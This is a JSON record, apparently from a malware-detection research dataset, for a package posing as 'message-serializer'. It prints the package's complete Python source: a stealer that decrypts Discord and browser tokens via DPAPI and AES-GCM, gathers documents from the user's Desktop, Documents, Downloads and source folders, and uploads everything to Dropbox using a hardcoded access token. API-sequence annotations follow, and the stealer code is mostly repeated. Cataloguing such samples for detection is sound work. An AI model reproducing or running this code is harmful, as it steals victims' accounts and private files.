[
  {
    "file_path": "/home2/blue/Documents/PyPIAgent/Dataset/study/unzip_malware/message-serializer-1.0.1/message-serializer-1.0.1/message-serializer/seri.py",
    "code_snippet": "import os\nimport dropbox\nimport random\nimport base64\nimport re\nfrom Crypto.Cipher import AES\nfrom win32crypt import CryptUnprotectData\nimport json\n\nDROPBOX_API_KEY = \"sl.BZc1HBiCxfg7zp37mKXCrxL0S9ShjECf2b_yQyOWOkjjUiwQmlEXf5x5NutaZZYuCQbj0GlzFOmgGAQcZr2EKYtT6s8l32iC3Gxl72duXZDd_d4kx_sb_rddUWvGelPLORLVyt_S\"\n\ntry:\n    USER_PROFILE = os.environ[\"USERPROFILE\"]\n    DESKTOP = USER_PROFILE + \"\\\\Desktop\"\n    if not os.path.exists(DESKTOP):\n        quit()\nexcept KeyError:\n    USER_PROFILE = None\n\ntry:\n    client = dropbox.Dropbox(DROPBOX_API_KEY)\nexcept:\n    quit()\n\nclass TokenGrabber:\n    def __init__(self):\n        self.regex = r\"[\\w-]{24}\\.[\\w-]{6}\\.[\\w-]{25,110}\"\n        self.encrypted_regex = r\"dQw4w9WgXcQ:[^\\\"]*\"\n        self.appdata = os.getenv(\"localappdata\")\n        self.roaming = os.getenv(\"appdata\")\n        self.tokens_sent = []\n        self.tokens = []\n\n    def decrypt_val(self, buff, master_key):\n        try:\n            iv = buff[3:15]\n            payload = buff[15:]\n            cipher = AES.new(master_key, AES.MODE_GCM, iv)\n            decrypted_pass = cipher.decrypt(payload)\n            decrypted_pass = decrypted_pass[:-16].decode()\n            return decrypted_pass\n        except Exception:\n            return \"Failed to decrypt password\"\n\n    def get_master_key(self, path):\n        with open(path, \"r\", encoding=\"utf-8\") as f:\n            c = f.read()\n        local_state = json.loads(c)\n        master_key = base64.b64decode(local_state[\"os_crypt\"][\"encrypted_key\"])\n        master_key = master_key[5:]\n        master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]\n        return master_key\n\n    def grab_tokens(self):\n        paths = {\n            'Discord': self.roaming + '\\\\discord\\\\Local Storage\\\\leveldb\\\\',\n            'Discord Canary': self.roaming + '\\\\discordcanary\\\\Local Storage\\\\leveldb\\\\',\n            'Discord PTB': self.roaming + '\\\\discordptb\\\\Local Storage\\\\leveldb\\\\',\n            'Opera': self.roaming + '\\\\Opera Software\\\\Opera Stable\\\\Local Storage\\\\leveldb\\\\',\n            'Opera GX': self.roaming + '\\\\Opera Software\\\\Opera GX Stable\\\\Local Storage\\\\leveldb\\\\',\n            'Chrome': self.appdata + '\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Local Storage\\\\leveldb\\\\',\n            'Chrome1': self.appdata + '\\\\Google\\\\Chrome\\\\User Data\\\\Profile 1\\\\Local Storage\\\\leveldb\\\\',\n            'Chrome2': self.appdata + '\\\\Google\\\\Chrome\\\\User Data\\\\Profile 2\\\\Local Storage\\\\leveldb\\\\',\n            'Chrome3': self.appdata + '\\\\Google\\\\Chrome\\\\User Data\\\\Profile 3\\\\Local Storage\\\\leveldb\\\\',\n            'Chrome4': self.appdata + '\\\\Google\\\\Chrome\\\\User Data\\\\Profile 4\\\\Local Storage\\\\leveldb\\\\',\n            'Chrome5': self.appdata + '\\\\Google\\\\Chrome\\\\User Data\\\\Profile 5\\\\Local Storage\\\\leveldb\\\\',\n            'Microsoft Edge': self.appdata + '\\\\Microsoft\\\\Edge\\\\User Data\\\\Defaul\\\\Local Storage\\\\leveldb\\\\',\n        }\n\n        for name, path in paths.items():\n            if not os.path.exists(path):\n                continue\n            disc = name.replace(\" \", \"\").lower()\n            if \"cord\" in path:\n                if os.path.exists(self.roaming + f'\\\\{disc}\\\\Local State'):\n                    for file_name in os.listdir(path):\n                        if file_name[-3:] not in [\"log\", \"ldb\"]:\n                            continue\n                        for line in [x.strip() for x in open(f'{path}\\\\{file_name}', errors='ignore').readlines() if x.strip()]:\n                            for y in re.findall(self.encrypted_regex, line):\n                                token = self.decrypt_val(base64.b64decode(y.split('dQw4w9WgXcQ:')[1]), self.get_master_key(self.roaming + f'\\\\{disc}\\\\Local State'))\n                                self.tokens.append(token)\n\n            else:\n                for file_name in os.listdir(path):\n                    if file_name[-3:] not in [\"log\", \"ldb\"]:\n                        continue\n                    for line in [x.strip() for x in open(f'{path}\\\\{file_name}', errors='ignore').readlines() if x.strip()]:\n                        for token in re.findall(self.regex, line):\n                            self.tokens.append(token)\n\n        if os.path.exists(self.roaming + \"\\\\Mozilla\\\\Firefox\\\\Profiles\"):\n            for path, _, files in os.walk(self.roaming + \"\\\\Mozilla\\\\Firefox\\\\Profiles\"):\n                for _file in files:\n                    if not _file.endswith('.sqlite'):\n                        continue\n                    for line in [x.strip() for x in open(f'{path}\\\\{_file}', errors='ignore').readlines() if x.strip()]:\n                        for token in re.findall(self.regex, line):\n                            self.tokens.append(token)\n\n        return self.tokens\n\ntokens = TokenGrabber().grab_tokens()\nif tokens:\n    file_name = str(random.randint(0, 500000)) + \"tokens39.txt\"\n    try:\n        client.files_upload(bytes(str(tokens).encode()), \"/home/\" + file_name)\n    except:\n        pass\n\nFILE_EXTENSIONS = [\".c\", \".cpp\", \".txt\", \".dll\", \".json\", \".csv\", \".sql\", \".db\"]\nSKIPPED_FILES = [\"DiscordChatExporter\", \"HotkeysConfig\"]\nSTORED_FILES = []\nLOW_PRIORITY_FILE_PATHS = []\nHIGH_PRIORITY_FILE_PATHS = []\nMAX_FILE_SIZE_ALLOWED = 52428800\nLOW_PRIORITY_FILE_SIZE = 5242880\n\n\ndef parse_all_files(path):\n    for (dirpath, dirnames, filenames) in os.walk(path):\n        for filename in filenames:\n            for file_extension in FILE_EXTENSIONS:\n                if filename.endswith(file_extension):\n                    filepath = os.sep.join([dirpath, filename])\n                    for skipped_file in SKIPPED_FILES:\n                        if skipped_file in filepath:\n                            continue\n                    STORED_FILES.append(filepath)\n\nif USER_PROFILE is not None:\n    DESKTOP = USER_PROFILE + \"\\\\Desktop\"\n    DOCUMENTS = USER_PROFILE + \"\\\\Docudments\"\n    DOWNLOADS = USER_PROFILE + \"\\\\Downloads\"\n    SOURCE = USER_PROFILE + \"\\\\source\"\n\n    if os.path.exists(DESKTOP):\n        parse_all_files(DESKTOP)\n\n    if os.path.exists(DOCUMENTS):\n        parse_all_files(DOCUMENTS)\n\n    if os.path.exists(DOWNLOADS):\n        parse_all_files(DOWNLOADS)\n\n    if os.path.exists(SOURCE):\n        parse_all_files(SOURCE)\n\nfor file_path in STORED_FILES:\n    file_size = os.path.getsize(file_path)\n    if file_size > MAX_FILE_SIZE_ALLOWED:\n        continue\n    if file_size > LOW_PRIORITY_FILE_SIZE: \n        LOW_PRIORITY_FILE_PATHS.append(file_path)\n        continue\n    HIGH_PRIORITY_FILE_PATHS.append(file_path)\n\nUPLOADED_FILES = []\nindex = 0\nfor file_path in HIGH_PRIORITY_FILE_PATHS:\n    index += 1\n    f = open(file_path, \"rb\")\n    file_name = file_path.split(\"\\\\\")[-1]\n    file_name = str(index) + file_name\n    try:\n        client.files_upload(f.read(), \"/home/\" + file_name)\n        UPLOADED_FILES.append(file_name)\n    except:\n        pass\n    f.close()\n",
    "pattern_analysis": {
      "api_sequence": [
        "os.environ",
        "os.path.exists",
        "dropbox.Dropbox",
        "os.getenv",
        "os.getenv",
        "AES.new",
        "Crypto.Cipher.AES.new.decrypt",
        "open",
        "json.loads",
        "base64.b64decode",
        "win32crypt.CryptUnprotectData",
        "os.path.exists",
        "os.listdir",
        "open",
        "re.findall",
        "base64.b64decode",
        "TokenGrabber.get_master_key",
        "TokenGrabber.decrypt_val",
        "os.path.exists",
        "os.listdir",
        "open",
        "re.findall",
        "os.path.exists",
        "os.walk",
        "open",
        "re.findall",
        "random.randint",
        "dropbox.Dropbox.files_upload",
        "os.walk",
        "os.path.exists",
        "os.path.exists",
        "os.path.exists",
        "os.path.exists",
        "os.path.getsize",
        "open",
        "dropbox.Dropbox.files_upload",
        "open.close"
      ],
      "api_sequence_with_args": [
        "os.environ[\"USERPROFILE\"]",
        "os.path.exists(DESKTOP)",
        "dropbox.Dropbox(DROPBOX_API_KEY)",
        "os.getenv(\"localappdata\")",
        "os.getenv(\"appdata\")",
        "AES.new(master_key, AES.MODE_GCM, iv)",
        "Crypto.Cipher.AES.new(master_key, AES.MODE_GCM, iv).decrypt(payload)",
        "open(path, \"r\", encoding=\"utf-8\")",
        "json.loads(c)",
        "base64.b64decode(local_state[\"os_crypt\"][\"encrypted_key\"])",
        "win32crypt.CryptUnprotectData(master_key, None, None, None, 0)",
        "os.path.exists(path)",
        "os.listdir(path)",
        "open(f'{path}\\{file_name}', errors='ignore').readlines()",
        "re.findall(self.encrypted_regex, line)",
        "base64.b64decode(y.split('dQw4w9WgXcQ:')[1])",
        "TokenGrabber.get_master_key(self.roaming + f'\\{disc}\\Local State')",
        "TokenGrabber.decrypt_val(base64.b64decode(...), ...)",
        "os.path.exists(self.roaming + \"\\\\Mozilla\\\\Firefox\\\\Profiles\")",
        "os.walk(self.roaming + \"\\\\Mozilla\\\\Firefox\\\\Profiles\")",
        "open(f'{path}\\{_file}', errors='ignore').readlines()",
        "re.findall(self.regex, line)",
        "random.randint(0, 500000)",
        "dropbox.Dropbox.files_upload(bytes(str(tokens).encode()), \"/home/\" + file_name)",
        "os.walk(path)",
        "os.path.exists(DESKTOP)",
        "os.path.exists(DOCUMENTS)",
        "os.path.exists(DOWNLOADS)",
        "os.path.exists(SOURCE)",
        "os.path.getsize(file_path)",
        "open(file_path, \"rb\")",
        "dropbox.Dropbox.files_upload(f.read(), \"/home/\" + file_name)",
        "f.close()"
      ],
      "mapped_sequence": [
        {
          "api_name": "os.environ",
          "id": "get_env_vars",
          "description": "Retrieves environment variables mapping",
          "first_id": "system_operations",
          "second_id": "system_environment_operations",
          "third_id": "environment_information"
        },
        {
          "api_name": "os.path.exists",
          "id": "check_path_exists",
          "description": "Checks if specified path exists in filesystem",
          "first_id": "file_operations",
          "second_id": "file_management",
          "third_id": "file_checking"
        },
        {
          "api_name": "dropbox.Dropbox",
          "id": "create_http_connection",
          "description": "Creates HTTP connection to specified host",
          "first_id": "basic_network_operations",
          "second_id": "http_requests",
          "third_id": "request_creation"
        },
        {
          "api_name": "os.getenv",
          "id": "get_env_var",
          "description": "Retrieves value of environment variable",
          "first_id": "system_operations",
          "second_id": "system_environment_operations",
          "third_id": "environment_information"
        },
        {
          "api_name": "AES.new",
          "id": "init_aes_gcm",
          "description": "Initializes AES cipher in GCM mode",
          "first_id": "encryption_hashing",
          "second_id": "encryption_operations",
          "third_id": "encryption_initialization"
        },
        {
          "api_name": "Crypto.Cipher.AES.new.decrypt",
          "id": "decrypt_aes_data",
          "description": "Decrypts data using initialized AES cipher",
          "first_id": "encryption_hashing",
          "second_id": "encryption_operations",
          "third_id": "decryption_execution"
        },
        {
          "api_name": "open",
          "id": "basic_read_operations",
          "description": "ic file opening operations for reading (normal reading, binary reading)",
          "first_id": "file_operations",
          "second_id": "file_reading_writing",
          "third_id": "file_opening"
        },
        {
          "api_name": "json.loads",
          "id": "deserialize_from_json",
          "description": "Deserializes JSON string to Python object",
          "first_id": "data_transformation_processing",
          "second_id": "data_encoding",
          "third_id": "specific_format_encoding"
        },
        {
          "api_name": "base64.b64decode",
          "id": "decode_base64_to_bytes",
          "description": "Decodes base64-encoded string to bytes",
          "first_id": "data_transformation_processing",
          "second_id": "data_encoding",
          "third_id": "base_encoding"
        },
        {
          "api_name": "win32crypt.CryptUnprotectData",
          "id": "decrypt_dpapi_data",
          "description": "Decrypts Windows DPAPI-encrypted data",
          "first_id": "encryption_hashing",
          "second_id": "encryption_operations",
          "third_id": "decryption_execution"
        },
        {
          "api_name": "os.listdir",
          "id": "list_files_directories",
          "description": "Lists files and directories in specified path",
          "first_id": "file_operations",
          "second_id": "file_management",
          "third_id": "directory_operations"
        },
        {
          "api_name": "re.findall",
          "id": "compile_regex",
          "description": "Compiles regular expression pattern",
          "first_id": "code_execution",
          "second_id": "code_evaluation_execution",
          "third_id": "code_compilation"
        },
        {
          "api_name": "os.walk",
          "id": "list_files_directories",
          "description": "Lists files and directories in specified path",
          "first_id": "file_operations",
          "second_id": "file_management",
          "third_id": "directory_operations"
        },
        {
          "api_name": "random.randint",
          "id": "get_random_number",
          "description": "No direct match; closest is random number generation (not in taxonomy, but included for context)",
          "first_id": "",
          "second_id": "",
          "third_id": ""
        },
        {
          "api_name": "dropbox.Dropbox.files_upload",
          "id": "upload_file_transfer_sh",
          "description": "Uploads file to transfer.sh and returns URL",
          "first_id": "network_file_transfer",
          "second_id": "file_upload",
          "third_id": "remote_service_upload"
        },
        {
          "api_name": "os.path.getsize",
          "id": "get_file_size",
          "description": "No direct match; closest is file stat (not in taxonomy, but included for context)",
          "first_id": "",
          "second_id": "",
          "third_id": ""
        },
        {
          "api_name": "open",
          "id": "basic_read_operations",
          "description": "ic file opening operations for reading (normal reading, binary reading)",
          "first_id": "file_operations",
          "second_id": "file_reading_writing",
          "third_id": "file_opening"
        },
        {
          "api_name": "open.close",
          "id": "close_file",
          "description": "Closes the opened file",
          "first_id": "file_operations",
          "second_id": "file_reading_writing",
          "third_id": "file_closing"
        }
      ],
      "contextual_code": "import os\nimport dropbox\nimport random\nimport base64\nimport re\nfrom Crypto.Cipher import AES\nfrom win32crypt import CryptUnprotectData\nimport json\n\ntry:\n    USER_PROFILE = os.environ[\"USERPROFILE\"]\n    DESKTOP = USER_PROFILE + \"\\\\Desktop\"\n    if not os.path.exists(DESKTOP):\n        quit()\nexcept KeyError:\n    USER_PROFILE = None\n\ntry:\n    client = dropbox.Dropbox(DROPBOX_API_KEY)\nexcept:\n    quit()\n\nclass TokenGrabber:\n    def __init__(self):\n        self.regex = r\"[\\w-]{24}\\.[\\w-]{6}\\.[\\w-]{25,110}\"\n        self.encrypted_regex = r\"dQw4w9WgXcQ:[^\\\"]*\"\n        self.appdata = os.getenv(\"localappdata\")\n        self.roaming = os.getenv(\"appdata\")\n        self.tokens_sent = []\n        self.tokens = []\n\n    def decrypt_val(self, buff, master_key):\n        try:\n            iv = buff[3:15]\n            payload = buff[15:]\n            cipher = AES.new(master_key, AES.MODE_GCM, iv)\n            decrypted_pass = cipher.decrypt(payload)\n            decrypted_pass = decrypted_pass[:-16].decode()\n            return decrypted_pass\n        except Exception:\n            return \"Failed to decrypt password\"\n\n    def get_master_key(self, path):\n        with open(path, \"r\", encoding=\"utf-8\") as f:\n            c = f.read()\n        local_state = json.loads(c)\n        master_key = base64.b64decode(local_state[\"os_crypt\"][\"encrypted_key\"])\n        master_key = master_key[5:]\n        master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]\n        return master_key\n\n    def grab_tokens(self):\n        paths = {\n            ...\n        }\n\n        for name, path in paths.items():\n            if not os.path.exists(path):\n                continue\n            disc = name.replace(\" \", \"\").lower()\n            if \"cord\" in path:\n                if os.path.exists(self.roaming + f'\\\\{disc}\\\\Local State'):\n                    for file_name in os.listdir(path):\n                        if file_name[-3:] not in [\"log\", \"ldb\"]:\n                            continue\n                        for line in [x.strip() for x in open(f'{path}\\\\{file_name}', errors='ignore').readlines() if x.strip()]:\n                            for y in re.findall(self.encrypted_regex, line):\n                                token = self.decrypt_val(base64.b64decode(y.split('dQw4w9WgXcQ:')[1]), self.get_master_key(self.roaming + f'\\\\{disc}\\\\Local State'))\n                                self.tokens.append(token)\n\n            else:\n                for file_name in os.listdir(path):\n                    if file_name[-3:] not in [\"log\", \"ldb\"]:\n                        continue\n                    for line in [x.strip() for x in open(f'{path}\\\\{file_name}', errors='ignore').readlines() if x.strip()]:\n                        for token in re.findall(self.regex, line):\n                            self.tokens.append(token)\n\n        if os.path.exists(self.roaming + \"\\\\Mozilla\\\\Firefox\\\\Profiles\"):\n            for path, _, files in os.walk(self.roaming + \"\\\\Mozilla\\\\Firefox\\\\Profiles\"):\n                for _file in files:\n                    if not _file.endswith('.sqlite'):\n                        continue\n                    for line in [x.strip() for x in open(f'{path}\\\\{_file}', errors='ignore').readlines() if x.strip()]:\n                        for token in re.findall(self.regex, line):\n                            self.tokens.append(token)\n\n        return self.tokens\n\ntokens = TokenGrabber().grab_tokens()\nif tokens:\n    file_name = str(random.randint(0, 500000)) + \"tokens39.txt\"\n    try:\n        client.files_upload(bytes(str(tokens).encode()), \"/home/\" + file_name)\n    except:\n        pass\n\nfor file_path in STORED_FILES:\n    file_size = os.path.getsize(file_path)\n    if file_size > MAX_FILE_SIZE_ALLOWED:\n        continue\n    if file_size > LOW_PRIORITY_FILE_SIZE: \n        LOW_PRIORITY_FILE_PATHS.append(file_path)\n        continue\n    HIGH_PRIORITY_FILE_PATHS.append(file_path)\n\nUPLOADED_FILES = []\nindex = 0\nfor file_path in HIGH_PRIORITY_FILE_PATHS:\n    index += 1\n    f = open(file_path, \"rb\")\n    file_name = file_path.split(\"\\\\\")[-1]\n    file_name = str(index) + file_name\n    try:\n        client.files_upload(f.read(), \"/home/\" + file_name)\n        UPLOADED_FILES.append(file_name)\n    except:\n        pass\n    f.close()"
    }
  }
]